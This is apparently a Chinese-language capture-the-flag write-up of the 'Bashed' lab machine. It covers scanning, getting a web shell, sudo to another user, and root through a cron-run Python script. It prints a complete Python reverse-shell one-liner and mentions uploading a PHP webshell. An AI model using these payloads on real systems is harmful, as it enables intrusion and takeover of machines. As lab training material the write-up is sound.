## nmap

```Bash
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site

```



## 80

目录爆破

![](https://secure2.wostatic.cn/static/wGXcX6ghbzmtj9EiDojX68/image.png?auth_key=1677500138-vfUvjzFo3btfUUpcTFHtFs-0-0a7b4174fb8fccd178269e7321fdc270)



拿到一个bash界面，用python3的反弹shell成功

在/home目录下拿到www-data的user.txt



/home目录中存在另一个用户 scriptmanager，sudo -l显示该www-data可以sudo以scriptmanager执行

```Bash
# 切换到scriptmanager下
 sudo -u scriptmanager bash

```



找到一个定时执行的目录和脚本，脚本生成的txt文件是root权限，说明脚本是被root执行的

```Bash
scriptmanager@bashed:/scripts$ ls -lh
ls -lh
total 8.0K
-rw-r--r-- 1 scriptmanager scriptmanager 58 Dec  4  2017 test.py
-rw-r--r-- 1 root          root          12 Jan  1 04:18 test.txt
scriptmanager@bashed:/scripts$

scriptmanager@bashed:/scripts$ date
date
Sun Jan  1 04:19:05 PST 2023
scriptmanager@bashed:/scripts$ pwd
pwd
/scripts
scriptmanager@bashed:/scripts$

```



将test.py修改成执行反弹shell

```Bash
# 这里发现revershells.com 的python 都不行，只有用 pentestmonkey的那个才能成功
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```



## beyond root

参考了下之前round1 的解题，这里还有几个思路

1、利用uploads文件夹可以渲染的前提，传一个php木马到uploads文件加里面，渲染后拿到shell

2、提权也可以用ubuntu的版本，直接用c脚本提权



